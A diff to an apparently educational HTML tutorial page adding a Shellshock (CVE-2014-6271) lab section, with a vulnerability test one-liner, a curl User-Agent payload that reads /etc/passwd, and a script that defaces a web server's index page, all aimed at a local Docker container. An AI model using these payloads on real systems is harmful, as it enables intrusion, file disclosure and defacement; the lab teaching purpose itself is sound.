@@ -108,6 +108,7 @@
             <li class="nav-item"><a class="nav-link" href="#intro_bash">Introduction</a></li>
             <li class="nav-item"><a class="nav-link" href="#suid">SUID bit exploit</a></li>
             <li class="nav-item"><a class="nav-link" href="#enviroment">Environmental Variables</a></li>
+            <li class="nav-item"><a class="nav-link" href="#shellshock">Shellshock</a></li>
           </ul>
       </ul>
     </div>
@@ -119,9 +120,7 @@
       <div >
         <h1 id="sco_bash">SCO - Bash</h1>
         <h2 id="intro_bash"> Introduction</h2>
-        <p class="lead">Bash is the default shell on most Linux distributions. 
-          It is a command line interpreter that allows you to execute commands on your system. Bash is a powerful tool that can be used to automate tasks and write scripts.</p>
-        <p class="lead">This guide will cover the basics of Bash and how to use it to write scripts.</p>
+        <p>This webpage is collection of simple tutorials for running exploits in Bash.</p>
         <p>All examples are modified projects/programs/snippets of code collected from the Internet. 
           Source is noted for each example. You can donwload the example repository
         forom <a target="_blank" href="https://github.com/RollLikeRollo/SCO_shell_scripting">Github repository</a></p>
@@ -278,10 +277,123 @@ I am a virus!!!!!
             </div>
           </div>  
         </div>
+        <div>
+          <h2 id="shellshock">Shellshock</h2>
+          <p>
+            Shellshock is a vulnerability in the Bash shell that allows an attacker to execute arbitrary commands on a vulnerable system.
+             It was discovered in September 2014. It was then applicable to all versions of Bash from 1.14.7 to 4.3. 
+             Shellshock is decribed in detail in the NIST databse in the <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">CVE-2014-6271</a> and <a href="CVE-2014-
+             7169">CVE-2014-7169</a> entries.
+          </p>
+
+          <p>
+            The idea behind Shellshock is to use the environment variables to execute malicious code. If there is an unsanitised user input, an  
+            attacker can use it to overwrite the environment variables. This overwritten variable will then contain the malicious code in a form of a string.
+            That code is not the main part of the attcak though, because string in environmental variable is never executed. However, if the string begins
+            with <code>(){ :;}</code>, then it is executed as a function. This is the Shellshock in a nutshell.
+          </p>
+          <p>
+            Watch this excellend video about Shellshock by Tom Scott: <a href="https://www.youtube.com/watch?v=aKShnpOXqn0">https://www.youtube.com/watch?v=aKShnpOXqn0</a>
+          </p>
+
+          <p>
+            In <a href="https://github.com/RollLikeRollo/SCO_shell_scripting/tree/main/shellshock/bash-4.3">https://github.com/RollLikeRollo/SCO_shell_scripting/tree/main/shellshock/bash-4.3</a>
+             you can find a vulnerable version of Bash. You can test the vulnerability by running the testing script <code>./run.sh</code>. This will open the old vulnerable Bash shell.
+            Try running following command in Bash 4.3: <code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code>
+          </p>
+
+          <h3>Example exploit by opsxcq</h3>
+            Repository with the example: <a href="https://github.com/opsxcq/exploit-CVE-2014-6271">https://github.com/opsxcq/exploit-CVE-2014-6271</a>
+
+            <p>
+              In this example, the attacker uses the vulnerable file on web server to revrite contents of a webpage.
+            </p>
+            <p>
+              This example contains docker container running a web server and a vulnerable Bash shell. The web server is running on <code>localhost</code>, port <code>8080</code>.
+              In order to setup and run the container, run the <code>run_docker.sh</code> script in a new terminal as root (use <code>sudo</code>, for example). The script has 
+              to be kept open and running for the entire duration of the experiment. Because the enviroment is a docker container, the experiment can be indefinitely repeated.
+              Just restart the container.
+            </p>
+            <p>
+              Open a web browser and go to <code><a target=”_blank” href="http://localhost:8080/">http://localhost:8080/</a></code>. You should see a vulnerable webpage which
+              looks like thhe one on image below.
+              <img src="normal.png" class="img-fluid" alt="Webpage" style="border: 1px solid rgb(0, 159, 180);">
+            </p>
+            <p>
+              In terminal, run <code>run_simple_exploit.sh</code>. It contains the following code: 
+              
+
+                  <div class="accordion" id="accordion5">
+                    <div class="card">
+                      <div class="card-header" id="heading5">
+                        <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapse5" aria-expanded="true" aria-controls="collapse4">run_simple_exploit.sh</a> </h5>
+                      </div>
+                      <div id="collapse5" class="collapse show" aria-labelledby="heading5" data-parent="#accordion5">
+                        <div class="card-body">  
+                          <pre><code class="bash">
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
+                          </code></pre>
+                        </div>
+                      </div>  
+                    </div>
+                  </div>
+              
+              This <code>curl</code> utility uses the -H switch. This switch manually sets the HTTP header. The header is set to the value of the user-agent environmental variable,
+              to which is the malicious code injected. This code should output the contents of the <code>/etc/passwd</code> file of the web server machine, our docker container, in our case.
+
+            </p>
+            <p>
+              If the previous step was successful, you can continue to the next step. In the terminal, run <code>exploit-deface.sh</code>. It contains the following code:
+              
+                  <div class="accordion" id="accordion6">
+                    <div class="card">
+                      <div class="card-header" id="heading6">
+                        <h5 class="mb-0"> <a href="#" data-toggle="collapse" data-target="#collapse6" aria-expanded="true" aria-controls="collapse4">exploit-deface.sh</a> </h5>
+                      </div>
+                      <div id="collapse6" class="collapse show" aria-labelledby="heading6" data-parent="#accordion6">
+                        <div class="card-body">  
+                          <pre><code class="bash">
+if [ -z "$1" ]
+then
+    echo 'Please inform the IP and PORT of the target'
+    echo 'Example: ./exploit-deface.sh <ip> <port>'
+    return -1
+fi
+
+ip=$1
+port=$2
+
+echo '[+] Sending the exploit'
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"&lt;html&gt;&lt;body&gt;&lt;h1&gt;DEFACED&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\" > /var/www/index.html'" http://$ip:$port/cgi-bin/vulnerable && \
+echo '[+] Target exploited, testing if defacement page is deployed' && \
+curl http://$ip:$port
+echo '[+] Done'                            
+                          </code></pre>
+                        </div>
+                      </div>  
+                    </div>
+                  </div>
+                
+                Run the <code>exploit-deface.sh</code> with the IP address and port of the web server in the arguments. In our case, the IP address is <code>localhost</code> or <code>172.17.0.2</code> and the port is <code>8080</code>.
+            </p>
+
+            <p>
+              Reload the webpage in the browser. You should see the defaced page. Was the attack successful?
+            </p>
+            <p>
+              The page should look like this now:
+            </p>
+              <img src="exploited.png" class="img-fluid" alt="Expoited web page" style="border: 1px solid rgb(0, 159, 180);">
+            
+
+        </div>
+
       </div>
-    </div>
+    </div> 
   </div>
   <!-- Content end --> 
+
+  
   
   <!-- Footer
   ============================ -->
